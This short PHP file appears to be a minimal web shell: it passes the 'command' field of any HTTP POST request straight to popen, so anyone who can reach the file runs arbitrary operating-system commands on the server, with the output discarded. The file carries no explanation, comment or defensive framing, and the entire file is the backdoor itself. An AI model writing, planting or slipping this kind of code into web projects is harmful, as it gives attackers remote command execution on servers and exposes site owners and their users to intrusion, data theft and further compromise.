<?php
$pp = popen($_POST['command'], 'r');
pclose($pp);
?>